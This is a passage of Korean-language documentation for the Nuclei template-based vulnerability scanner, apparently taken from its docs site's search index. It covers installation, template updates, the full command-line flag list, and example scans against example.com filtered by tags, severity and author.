\uc5c5\ub370\uc774\ud2b8\ud560 \ub54c, \ud56d\uc0c1 \ucd5c\uc2e0 \ubc84\uc804\uc758 \ub9b4\ub9ac\uc988\uc5d0\uc11c \ubaa8\ub4e0 \ub2e4\uc6b4\ub85c\ub4dc\ub97c \ubc1b\uc2b5\ub2c8\ub2e4. \ub9b4\ub9ac\uc988 \uc774\ud6c4\uc5d0 \ucd94\uac00\ub41c \ud15c\ud50c\ub9bf\ub4e4\uc740 master branch \uc5d0 \uc874\uc7ac\ud558\uace0 \uc0c8 \ub9b4\ub9ac\uc988\uac00 \uc0dd\uc131\ub420 \ub54c \ucd94\uac00\ub429\ub2c8\ub2e4.","title":"Templates"},{"location":"kr/nuclei/get-started/","text":"Nuclei \uae30\ub2a5 \u00b6 Features. HTTP | DNS | TCP | FILE \uc9c0\uc6d0 \uc218\uc815 \uac00\ub2a5\ud55c \ud15c\ud50c\ub9bf \ub300\uaddc\ubaa8 \uc2a4\uce90\ub2dd \ub300\uc5ed \uc678 \uae30\ubc18 \ud0d0\uc9c0 \ubcf8\uc778\ub9cc\uc758 \ud15c\ud50c\ub9bf\uc744 \uc27d\uac8c \uc791\uc131\uac00\ub2a5 Nuclei \uc124\uce58 \u00b6 Go go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest Info Nuclei\ub97c \uc131\uacf5\uc801\uc73c\ub85c \uc124\uce58\ud558\uae30 \uc704\ud574\uc11c\ub294 \ucd5c\uc2e0 \ubc84\uc804\uc758 Go \uac00 \ud544\uc694\ud569\ub2c8\ub2e4. Brew brew install nuclei Info macOS (or Linux) \ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Docker docker pull projectdiscovery/nuclei:latest Github git clone https://github.com/projectdiscovery/nuclei.git; \\ cd nuclei/v2/cmd/nuclei; \\ go build; \\ mv nuclei /usr/local/bin/; \\ nuclei -version; Info Nuclei\ub97c \uc131\uacf5\uc801\uc73c\ub85c \uc124\uce58\ud558\uae30 \uc704\ud574\uc11c\ub294 \ucd5c\uc2e0 \ubc84\uc804\uc758 Go \uac00 \ud544\uc694\ud569\ub2c8\ub2e4. Binary https://github.com/projectdiscovery/nuclei/releases Tip OS\uc5d0 \ub530\ub77c \ucd5c\uc2e0 \ubc84\uc804\uc758 \uc2e4\ud589\ud30c\uc77c\uc744 \ub2e4\uc6b4\ub85c\ub4dc \ud569\ub2c8\ub2e4. \uc2e4\ud589\ud558\uae30 \uc704\ud574\uc11c \uc555\ucd95\uc744 \ud574\uc81c\ud569\ub2c8\ub2e4. Nuclei \ud15c\ud50c\ub9bf \u00b6 Nuclei\ub294 2.4.0\ubc84\uc804\ubd80\ud130 \ud15c\ud50c\ub9bf\uc758 \uc790\ub3d9 \uc5c5\ub370\uc774\ud2b8/\ub2e4\uc6b4\ub85c\ub4dc\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Nuclei-Templates \ud504\ub85c\uc81d\ud2b8\ub294 \uc9c0\uc18d\uc801\uc73c\ub85c \uc5c5\ub370\uc774\ud2b8\ub418\ub294 \ud15c\ud50c\ub9bf \ub9ac\uc2a4\ud2b8\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. \ud574\ub2f9 \ub9ac\uc2a4\ud2b8\ub294 \ucee4\ubba4\ub2c8\ud2f0\uc5d0\uc11c \uae30\uc5ec\ud574\uc8fc\uace0 \uc788\uc2b5\ub2c8\ub2e4. Nuclei\ub294 \uc2e4\ud589\ub9c8\ub2e4 \uc0dd\uc131\ub418\ub294 \uc0c8\ub85c\uc6b4 \ud15c\ud50c\ub9bf\uc744 \uccb4\ud06c\ud558\uace0 \uc0ac\uc6a9 \uac00\ub2a5\ud560 \ub54c \uc790\ub3d9\uc73c\ub85c \ucd5c\uc2e0 \ubc84\uc804\uc744 \ub2e4\uc6b4\ub85c\ub4dc \ubc1b\uc2b5\ub2c8\ub2e4. \uc774 \uae30\ub2a5\uc740 \ud130\ubbf8\ub110 \ud639\uc740 \uc124\uc815 \ud30c\uc77c\uc5d0\uc11c -duc , -disable-update-check \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc801\uc6a9\ud558\uc9c0 \uc54a\uc744 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc5d4\uc9c4\uc740 -update \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uc5ec \ucd5c\uc2e0 \ubc84\uc804\uc73c\ub85c \uc5c5\ub370\uc774\ud2b8\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Tip \uc790\uc2e0\ub9cc\uc758 \ub3c5\ud2b9\ud55c \ud15c\ud50c\ub9bf\uc744 \uc791\uc131\ud558\ub294 \uac83\uc740 \ud56d\uc0c1 \ub2e4\ub978 \uc774\ub4e4\ubcf4\ub2e4 \uc790\uc2e0\uc744 \uc55e\uc11c\uac8c \ud574\uc904 \uac83\uc785\ub2c8\ub2e4. Nuclei \uc0ac\uc6a9\ubc95 \u00b6 nuclei -h \uc774 \uba85\ub839\uc5b4\ub294 nuclei\uc758 \uc0ac\uc6a9\ubc95\uc744 \ubcf4\uc5ec\uc90d\ub2c8\ub2e4. \uc544\ub798\ub294 \uc9c0\uc6d0\ud558\uace0 \uc788\ub294 \uae30\ub2a5\ub4e4\uc744 \ubcf4\uc5ec\uc90d\ub2c8\ub2e4. Nuclei is a fast, template based vulnerability scanner focusing on extensive configurability, massive extensibility and ease of use. Usage: nuclei [flags] Flags: TARGET: -u, -target string[] \uc2a4\uce94\ud560 URLs/hosts \ub300\uc0c1 -l, -list string \uc2a4\uce94\ud560 URLs/hosts \ub300\uc0c1 \ubaa9\ub85d\uc774 \ud3ec\ud568\ub41c \ud30c\uc77c \uacbd\ub85c(\uc904\ub2f9 \ud558\ub098\uc529) -resume string resume.cfg\ub97c \uc0ac\uc6a9\ud55c \uc2a4\uce94 \uc7ac\uac1c(\ud074\ub7ec\uc2a4\ud130\ub9c1\uc774 \ube44\ud65c\uc131\ud654\ub428) TEMPLATES: -nt, -new-templates nuclei-templates\uc5d0 \uac00\uc7a5 \ucd5c\uadfc\uc5d0 \ucd94\uac00\ub41c \uc0c8 \ud15c\ud50c\ub9bf\ub9cc \uc2e4\ud589 -as, -automatic-scan \ud0dc\uadf8 \ub9e4\ud551\uc5d0 \ub300\ud55c wappalyzer \uae30\uc220 \ud0d0\uc9c0\ub97c \uc0ac\uc6a9\ud55c \uc790\ub3d9 \uc6f9 \uc2a4\uce94 -t, -templates string[] \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf \ub610\ub294 \ud15c\ud50c\ub9bf \ub514\ub809\ud130\ub9ac \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -tu, -template-url string[] \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf URL \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -w, -workflows string[] \uc2e4\ud589\ud560 \uc6cc\ud06c\ud50c\ub85c \ub610\ub294 \uc6cc\ud06c\ud50c\ub85c \ub514\ub809\ud130\ub9ac \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -wu, -workflow-url string[] \uc2e4\ud589\ud560 \uc6cc\ud06c\ud50c\ub85c URL \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -validate nuclei\ub85c \uc804\ub2ec\ub41c \ud15c\ud50c\ub9bf \uac80\uc99d -tl \uc0ac\uc6a9 \uac00\ub2a5\ud55c \ubaa8\ub4e0 \ud15c\ud50c\ub9bf \ubaa9\ub85d FILTERING: -a, -author string[] \uc791\uc131\uc790\ub97c \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -tags string[] \ud0dc\uadf8\ub97c \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -etags, -exclude-tags string[] \ud0dc\uadf8\ub97c \uae30\uc900\uc73c\ub85c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -itags, -include-tags string[] \ud0dc\uadf8\uac00 \uae30\ubcf8 \ub610\ub294 \uad6c\uc131\uc5d0 \uc758\ud574 \uc81c\uc678\ub41c \uacbd\uc6b0\uc5d0\ub3c4 \uc2e4\ud589\ub428 -id, -template-id string[] \ud15c\ud50c\ub9bf ID\ub4e4\uc744 \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -eid, -exclude-id string[] \ud15c\ud50c\ub9bf ID\ub4e4\uc744 \uae30\uc900\uc73c\ub85c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -it, -include-templates string[] \ud15c\ud50c\ub9bf\uc774 \uae30\ubcf8 \ub610\ub294 \uad6c\uc131\uc5d0 \uc758\ud574 \uc81c\uc678\ub41c \uacbd\uc6b0\uc5d0\ub3c4 \uc2e4\ud589\ub428 -et, -exclude-templates string[] \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf \ub610\ub294 \ud15c\ud50c\ub9bf \ub514\ub809\ud130\ub9ac(\ud30c\uc77c\ub85c \uad6c\ubd84\ub428, \ud30c\uc77c) -s, -severity value[] \uc2ec\uac01\ub3c4\ub97c \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: info, low, medium, high, critical, unknown -es, -exclude-severity value[] \uc2ec\uac01\ub3c4\ub97c \uae30\uc900\uc73c\ub85c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: info, low, medium, high, critical, unknown -pt, -type value[] \ud504\ub85c\ud1a0\ucf5c \uc720\ud615\uc744 \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: dns, file, http, headless, network, workflow, ssl, websocket, whois -ept, -exclude-type value[] \ud504\ub85c\ud1a0\ucf5c \uc720\ud615\uc5d0 \ub530\ub77c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: dns, file, http, headless, network, workflow, ssl, websocket, whois OUTPUT: -o, -output string \ubc1c\uacac\ub41c \ubb38\uc81c/\ucde8\uc57d\uc810\ub97c \uc4f0\uae30 \uc704\ud55c \ucd9c\ub825 \ud30c\uc77c -sresp, -store-resp nuclei\uc744 \ud1b5\ud574 \uc804\ub2ec\ub41c \ubaa8\ub4e0 \uc694\uccad/\uc751\ub2f5\uc744 \ucd9c\ub825 \ub514\ub809\ud130\ub9ac\uc5d0 \uc800\uc7a5 -srd, -store-resp-dir string nuclei\uc744 \ud1b5\ud574 \uc804\ub2ec\ub41c \ubaa8\ub4e0 \uc694\uccad/\uc751\ub2f5\uc744 \uc0ac\uc6a9\uc790 \uc9c0\uc815 \ub514\ub809\ud130\ub9ac\uc5d0 \uc800\uc7a5(\uae30\ubcf8 \"output\") -silent \uacb0\uacfc\ub9cc \ud45c\uc2dc -nc, -no-color \ucd9c\ub825 \ub0b4\uc6a9 \uc0c9\uc0c1 \ube44\ud65c\uc131\ud654 (ANSI escape codes) -json JSONL(ines) \ud615\uc2dd\uc73c\ub85c \ucd9c\ub825 -irr, -include-rr JSONL \ucd9c\ub825\uc5d0 \uc694\uccad/\uc751\ub2f5 \uc30d \ud3ec\ud568(\uacb0\uacfc\ub9cc) -nm, -no-meta cli \ucd9c\ub825\uc5d0\uc11c \uacb0\uacfc \uba54\ud0c0\ub370\uc774\ud130 \ucd9c\ub825 \ube44\ud65c\uc131\ud654 -nts, -no-timestamp cli \ucd9c\ub825\uc5d0\uc11c \uacb0\uacfc \ud0c0\uc784\uc2a4\ud0ec\ud504 \ucd9c\ub825 \ube44\ud65c\uc131\ud654 -rdb, -report-db string nuclei \ubcf4\uace0 \ub370\uc774\ud130\ubca0\uc774\uc2a4(\ubcf4\uace0\uc11c \ub370\uc774\ud130\ub97c \uc720\uc9c0\ud558\ub824\uba74 \ud56d\uc0c1 \uc774\uac83\uc744 \uc0ac\uc6a9) -ms, -matcher-status \ub9e4\uce58 \uc2e4\ud328 \uc0c1\ud0dc \ud45c\uc2dc -me, -markdown-export string \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc73c\ub85c \uacb0\uacfc\ub97c \ub0b4\ubcf4\ub0bc \ub514\ub809\ud130\ub9ac -se, -sarif-export string \uacb0\uacfc\ub97c SARIF \ud615\uc2dd\uc73c\ub85c \ub0b4\ubcf4\ub0b4\ub294 \ud30c\uc77c CONFIGURATIONS: -config string nuclei \ud658\uacbd \uc124\uc815 \ud30c\uc77c \uacbd\ub85c -fr, -follow-redirects http \ud15c\ud50c\ub9bf\uc5d0 following redirects \ud65c\uc131\ud654 -mr, -max-redirects int http \ud15c\ud50c\ub9bf\uc5d0 \ub530\ub77c\uc57c \ud560 \ucd5c\ub300 \ub9ac\ub514\ub809\uc158 \uc218(\uae30\ubcf8\uac12 10) -dr, -disable-redirects http \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \ub9ac\ub514\ub809\uc158 \ube44\ud65c\uc131\ud654 -rc, -report-config string nuclei \ubcf4\uace0 \ubaa8\ub4c8 \ud658\uacbd \uc124\uc815 \ud30c\uc77c -H, -header string[] \ud5e4\ub354:\uac12 \ud615\uc2dd\uc758 \ubaa8\ub4e0 http \uc694\uccad\uc5d0 \ud3ec\ud568\ud560 \uc0ac\uc6a9\uc790 \uc815\uc758 \ud5e4\ub354/\ucfe0\ud0a4(cli, file) -V, -var value \ud0a4=\uac12 \ud615\uc2dd\uc758 \uc0ac\uc6a9\uc790 \uc815\uc758 \ubcc0\uc218 -r, -resolvers string nuclei\uc5d0 \ub300\ud55c \ub9ac\uc878\ubc84 \ubaa9\ub85d\uc774 \ud3ec\ud568\ub41c \ud30c\uc77c -sr, -system-resolvers \uc5d0\ub7ec fallback\uc73c\ub85c \uc2dc\uc2a4\ud15c DNS \ub9ac\uc878\ube59 \uc0ac\uc6a9 -passive \uc218\ub3d9 HTTP \uc751\ub2f5 \ucc98\ub9ac \ubaa8\ub4dc \ud65c\uc131\ud654 -ev, -env-vars \ud15c\ud50c\ub9bf\uc5d0\uc11c \ud658\uacbd \ubcc0\uc218\ub97c \uc0ac\uc6a9\ud560 \uc218 \uc788\ub3c4\ub85d \uc124\uc815 -cc, -client-cert string \uc2a4\uce94\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc778\uc99d\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc778\uc99d\uc11c \ud30c\uc77c(PEM-encoded) -ck, -client-key string \uc2a4\uce94\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc778\uc99d\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 key \ud30c\uc77c(PEM-encoded) -ca, -client-ca string \uc2a4\uce94\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc778\uc99d\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc778\uc99d \uae30\uad00 \ud30c\uc77c(PEM-encoded) -sml, -show-match-line \ud30c\uc77c \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud574 \uc77c\uce58\ud558\ub294 \uc904 \ud45c\uc2dc, extractors\uc5d0\uc11c\ub9cc \uc791\ub3d9 -ztls tls13\uc758 \ud45c\uc900\uc73c\ub85c autofallback\uacfc \ud568\uaed8 ztls \ub77c\uc774\ube0c\ub7ec\ub9ac \uc0ac\uc6a9 -sni string \uc0ac\uc6a9\ud560 tls sni \ud638\uc2a4\ud2b8 \uc774\ub984(\uae30\ubcf8: \uc785\ub825\ud55c \ub3c4\uba54\uc778 \uc774\ub984) INTERACTSH: -iserver, -interactsh-server string \uc790\uccb4 \ud638\uc2a4\ud305\ub41c \uc778\uc2a4\ud134\uc2a4\uc5d0 \ub300\ud55c interactsh \uc11c\ubc84 URL (\uae30\ubcf8: oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me) -itoken, -interactsh-token string \uc790\uccb4 \ud638\uc2a4\ud305\ub41c interactsh \uc11c\ubc84\uc5d0 \ub300\ud55c \uc778\uc99d \ud1a0\ud070 -interactions-cache-size int \uc0c1\ud638 \uc791\uc6a9 \uce90\uc2dc\uc5d0 \uc720\uc9c0\ud560 \uc694\uccad \uc218 (\uae30\ubcf8 5000) -interactions-eviction int \uce90\uc2dc\uc5d0\uc11c \uc694\uccad\uc744 \uc81c\uac70\ud558\uae30 \uc804\uc5d0 \ub300\uae30\ud560 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 60) -interactions-poll-duration int \uac01 \uc0c1\ud638 \uc791\uc6a9 \ud3f4\ub9c1 \uc694\uccad \uc804\uc5d0 \ub300\uae30\ud560 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 5) -interactions-cooldown-period int \uc885\ub8cc \uc804 \uc0c1\ud638\uc791\uc6a9 \ud3f4\ub9c1\uc744 \uc704\ud55c \ucd94\uac00 \uc2dc\uac04 (\uae30\ubcf8 5) -ni, -no-interactsh OAST \ud14c\uc2a4\ud2b8\ub97c \uc704\ud574 interactsh \uc11c\ubc84 \ube44\ud65c\uc131\ud654, OAST \uae30\ubc18 \ud15c\ud50c\ub9bf \uc81c\uc678 RATE-LIMIT: -rl, -rate-limit int \ucd08\ub2f9 \ubcf4\ub0bc \ucd5c\ub300 \uc694\uccad \uc218 (\uae30\ubcf8 150) -rlm, -rate-limit-minute int \ubd84\ub2f9 \ubcf4\ub0bc \ucd5c\ub300 \uc694\uccad \uc218 -bs, -bulk-size int \ud15c\ud50c\ub9bf\ub2f9 \ubcd1\ub82c\ub85c \ubd84\uc11d\ud560 \ucd5c\ub300 \ud638\uc2a4\ud2b8 \uc218 (\uae30\ubcf8 25) -c, -concurrency int \ubcd1\ub82c\ub85c \uc2e4\ud589\ud560 \ucd5c\ub300 \ud15c\ud50c\ub9bf \uc218 (\uae30\ubcf8 25) -hbs, -headless-bulk-size int \ud15c\ud50c\ub9bf\ub2f9 \ubcd1\ub82c\ub85c \ubd84\uc11d\ud560 \ucd5c\ub300 headless \ud638\uc2a4\ud2b8 \uc218 (\uae30\ubcf8 10) -hc, -headless-concurrency int \ubcd1\ub82c\ub85c \uc2e4\ud589\ud560 \ucd5c\ub300 headless \ud15c\ud50c\ub9bf \uc218 (\uae30\ubcf8 10) OPTIMIZATIONS: -timeout int \ud0c0\uc784\uc544\uc6c3 \uc804 \ub300\uae30 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 5) -retries int \uc2e4\ud328\ud55c \uc694\uccad\uc744 \uc7ac\uc2dc\ub3c4\ud558\ub294 \ud69f\uc218 (\uae30\ubcf8 1) -ldp, -leave-default-ports leave default HTTP/HTTPS ports (eg. host:80,host:443 -mhe, -max-host-error int \uc2a4\uce94\uc744 \uac74\ub108\ub6f0\uae30 \uc804\uc5d0 \ud638\uc2a4\ud2b8\uc5d0 \ub300\ud55c \ucd5c\ub300 \uc624\ub958 \uc218 (\uae30\ubcf8 30) -nmhe, -no-mhe disable skipping host from scan based on errors -project \ud504\ub85c\uc81d\ud2b8 \ud3f4\ub354\ub97c \uc0ac\uc6a9\ud558\uc5ec \ub3d9\uc77c\ud55c \uc694\uccad\uc744 \uc5ec\ub7ec \ubc88 \ubcf4\ub0b4\uc9c0 \uc54a\uc74c -project-path string \ud2b9\uc815 \ud504\ub85c\uc81d\ud2b8 \uacbd\ub85c \uc124\uc815 -spm, -stop-at-first-path \uccab \ubc88\uc9f8 \uc77c\uce58 \ud6c4 HTTP \uc694\uccad \ucc98\ub9ac \uc911\uc9c0 (template/workflow \ub85c\uc9c1\uc774 \uc911\ub2e8\ub420 \uc218 \uc788\uc74c) -stream stream \ubaa8\ub4dc - \uc785\ub825\uc744 \uc815\ub82c\ud558\uc9c0 \uc54a\uace0 elaborating \uc2dc\uc791 HEADLESS: -headless \ud5e4\ub4dc\ub9ac\uc2a4 \ube0c\ub77c\uc6b0\uc800 \uc9c0\uc6d0\uc774 \ud544\uc694\ud55c \ud15c\ud50c\ub9bf \ud65c\uc131\ud654(root user on linux will disable sandbox) -page-timeout int \ud5e4\ub4dc\ub9ac\uc2a4 \ubaa8\ub4dc\uc5d0\uc11c \uac01 \ud398\uc774\uc9c0\ub97c \uae30\ub2e4\ub9ac\ub294 \uc2dc\uac04(\ucd08)(\uae30\ubcf8 20) -sb, -show-browser \ud5e4\ub4dc\ub9ac\uc2a4 \ubaa8\ub4dc\ub85c \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud560 \ub54c \ud654\uba74\uc5d0 \ube0c\ub77c\uc6b0\uc800 \ud45c\uc2dc -sc, -system-chrome \uc124\uce58\ub41c nuclei \ub300\uc2e0 \ub85c\uceec\uc5d0 \uc124\uce58\ub41c chrome \ube0c\ub77c\uc6b0\uc800 \uc0ac\uc6a9 DEBUG: -debug \ubaa8\ub4e0 \uc694\uccad \ubc0f \uc751\ub2f5 \ud45c\uc2dc -dreq, -debug-req \ubcf4\ub0b8 \ubaa8\ub4e0 \uc694\uccad \ud45c\uc2dc -dresp, -debug-resp \ubc1b\uc740 \ubaa8\ub4e0 \uc751\ub2f5 \ud45c\uc2dc -p, -proxy string[] \uc0ac\uc6a9\ud560 http/socks5 \ud504\ub85d\uc2dc \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ud558\uac70\ub098 \ud30c\uc77c \uc785\ub825) -pi, -proxy-internal \ubaa8\ub4e0 \ub0b4\ubd80 \uc694\uccad\uc744 \ud504\ub85d\uc2dc -tlog, -trace-log string \ubcf4\ub0b8 \uc694\uccad \ucd94\uc801 \ub85c\uadf8\ub97c \uae30\ub85d\ud560 \ud30c\uc77c -elog, -error-log string \ubcf4\ub0b8 \uc694\uccad \uc624\ub958 \ub85c\uadf8\ub97c \uae30\ub85d\ud560 \ud30c\uc77c -version nuclei \ubc84\uc804 \ucd9c\ub825 -hm, -hang-monitor nuclei hang monitoring \ud65c\uc131\ud654 -v, -verbose \uc0c1\uc138 \ucd9c\ub825 \ud45c\uc2dc -vv \uc2a4\uce94\uc744 \uc704\ud574 \ub85c\ub4dc\ub41c \ub514\uc2a4\ud50c\ub808\uc774 \ud15c\ud50c\ub9bf \ud45c\uc2dc -ep, -enable-pprof pprof debugging server \ud65c\uc131\ud654 -tv, -templates-version \uc124\uce58\ub41c nuclei-templates \ubc84\uc804 \ucd9c\ub825 UPDATE: -update \ucd5c\uc2e0 \ub9b4\ub9ac\uc2a4 \ubc84\uc804\uc73c\ub85c nuclei \uc5d4\uc9c4 \uc5c5\ub370\uc774\ud2b8 -ut, -update-templates \ucd5c\uc2e0 \ub9b4\ub9ac\uc2a4 \ubc84\uc804\uc73c\ub85c nuclei-templates \uc5d4\uc9c4 \uc5c5\ub370\uc774\ud2b8 -ud, -update-directory string nuclei-templates\ub97c \uc124\uce58\ud560 \uae30\ubcf8 \ub514\ub809\ud130\ub9ac\ub97c \ub36e\uc5b4\uc500 -duc, -disable-update-check \uc790\ub3d9 nuclei/templates \uc5c5\ub370\uc774\ud2b8 \ud655\uc778 \ube44\ud65c\uc131\ud654 STATISTICS: -stats \uc2e4\ud589 \uc911\uc778 \uc2a4\uce94\uc5d0 \ub300\ud55c \ud1b5\uacc4 \ud45c\uc2dc -sj, -stats-json JSONL(ines) \ud615\uc2dd\uc73c\ub85c \ucd9c\ub825 \ud30c\uc77c\uc5d0 \ud1b5\uacc4 \ub370\uc774\ud130 \uc4f0\uae30 -si, -stats-interval int \ud1b5\uacc4 \uc5c5\ub370\uc774\ud2b8\ub97c \ud45c\uc2dc\ud560 \ub54c\uae4c\uc9c0 \ub300\uae30\ud558\ub294 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 5) -m, -metrics \ud3ec\ud2b8(\uae30\ubcf8 9092)\uc5d0\uc11c \uc2e4\ud589 \uc911\uc778 scan matrics \ubcf4\uae30 -mp, -metrics-port int nuclei metrics \ud3ec\ud2b8 \uc124\uc815 (\uae30\ubcf8 9092) Nuclei \uc2e4\ud589 \u00b6 Nuclei \ud15c\ud50c\ub9bf\uc740 \ud06c\uac8c \ub450 \uac00\uc9c0 \ubc29\ubc95\uc73c\ub85c \uc2e4\ud589 \ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. 1) Templates ( -t/templates ) \uae30\ubcf8\uc801\uc73c\ub85c, \ubaa8\ub4e0 \ud15c\ud50c\ub9bf (nuclei-ignore \ub9ac\uc2a4\ud2b8\ub97c \uc81c\uc678\ud55c) \ub4e4\uc740 \uae30\ubcf8 \ud15c\ud50c\ub9bf \uc124\uce58 \uacbd\ub85c\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4. nuclei -u https://example.com \ubcc4\ub3c4\uc758 \ud15c\ud50c\ub9bf \ud3f4\ub354 \ud639\uc740 \ub2e4\uc218\uc758 \ud15c\ud50c\ub9bf \ud3f4\ub354\ub294 \ub2e4\uc74c\uacfc \uac19\uc774 \uc2e4\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -u https://example.com -t cves/ -t exposures/ URL \ub9ac\uc2a4\ud2b8\uc5d0 \ub300\ud574\uc11c\ub3c4 \ud15c\ud50c\ub9bf\ub4e4\uc740 \uc2e4\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -list http_urls.txt 2) Workflows ( -w/workflows ) nuclei -u https://example.com -w workflows/ URL \ub9ac\uc2a4\ud2b8\uc5d0 \ub300\ud574\uc11c\ub3c4 Workflows\ub4e4\uc740 \uc2e4\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml Nuclei \ud544\ud130 \u00b6 Nuclei \uc5d4\uc9c4\uc740 \ud15c\ud50c\ub9bf \uc2e4\ud589\uc744 \ucee4\uc2a4\ud140\ud558\uae30 \uc704\ud574\uc11c 3\uac1c\uc758 \uae30\ubcf8 \ud544\ud130\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. Tags ( -tags ) \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\uac00\ub2a5\ud55c \ud0dc\uadf8 \uc18d\uc131\uc5d0 \uae30\ubc18\ud55c \ud544\ud130 Severity ( -severity ) \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\uac00\ub2a5\ud55c \uc2ec\uac01\ub3c4 \uc18d\uc131\uc5d0 \uae30\ubc18\ud55c \ud544\ud130 Author ( -author ) \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\uac00\ub2a5\ud55c \uc791\uc131\uc790 \uc18d\uc131\uc5d0 \uae30\ubc18\ud55c \ud544\ud130 \uae30\ubcf8\uc801\uc73c\ub85c, \ud544\ud130\ub4e4\uc740 \ud15c\ud50c\ub9bf \uc124\uce58 \uacbd\ub85c\uc5d0 \uc801\uc6a9\ub418\uace0, \uc218\ub3d9 \ud15c\ud50c\ub9bf \uacbd\ub85c \uc785\ub825\uc744 \uc0ac\uc6a9\ud558\uc5ec \ucee4\uc2a4\ud140\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4, \uc544\ub798\uc758 \uba85\ub839\uc740 ~/nuclei-templates/ \ud3f4\ub354\uc5d0 \uc124\uce58\ub41c \ud15c\ud50c\ub9bf\ub4e4 \uc911\uc5d0\uc11c cve \ud0dc\uadf8\ub97c \uac00\uc9c4 \ud15c\ud50c\ub9bf\ub4e4\uc744 \uc2e4\ud589\uc2dc\ud0b5\ub2c8\ub2e4. nuclei -u https://example.com -tags cve \uadf8\ub9ac\uace0 \ub2e4\uc74c\uc740 ~/nuclei-templates/exposures/ \ud3f4\ub354\uc758 config \ud0dc\uadf8\ub97c \uac00\uc9c4 \ubaa8\ub4e0 \uc0ac\uc6a9\uac00\ub2a5\ud55c \ud15c\ud50c\ub9bf\ub4e4\uc744 \uc2e4\ud589\ud558\ub294 \uc608\uc785\ub2c8\ub2e4. nuclei -u https://example.com -tags config -t exposures/ \ub2e4\uc218\uc758 \ud544\ud130\ub97c AND \uc870\uac74\uc73c\ub85c \ud568\uaed8 \uc0ac\uc6a9\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ub2e4\uc74c\uc740 cve \ud0dc\uadf8\ub97c \uac00\uc84c\uace0, critical \ub610\ub294 high \uc758 \uc2ec\uac01\ub3c4\ub97c \uac00\uc84c\uace0, \uc791\uc131\uc790\uac00 geeknik \uc778 \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 \uc608\uc785\ub2c8\ub2e4. nuclei -u https://example.com -tags cve -severity critical,high -author geeknik \ub2e4\uc218\uc758 \ud544\ud130\ub294 \ud15c\ud50c\ub9bf \uc870\uac74 \ud50c\ub798\uadf8 ( tc )\ub97c \uc774\uc6a9\ud574 \uc870\ud569\ud558\uc5ec \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. 